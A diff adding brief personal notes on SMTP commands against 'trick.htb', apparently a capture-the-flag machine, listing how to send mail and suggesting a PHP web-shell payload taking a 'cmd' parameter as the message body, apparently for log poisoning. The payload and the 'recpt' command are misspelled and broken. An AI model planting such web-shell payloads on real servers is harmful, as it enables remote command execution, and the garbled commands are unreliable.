@@ -1,0 +1,13 @@
+# Important commands 
+# For example we have server mail called trick.htb
+
+1) ehlo trick.htb
+
+# To send an email
+
+1) mail from:<moataz-bllah@trick.htb>    # spicify the sender
+2) recpt to:<micheal@trick.htb> OR micheal  # spicify the reciever
+3) data              
+4) subject: write anything you want
+5) Write the content of the mail ex: <?php syetem($_GET['cmd'];)?>
+6) .       # to finish the email 
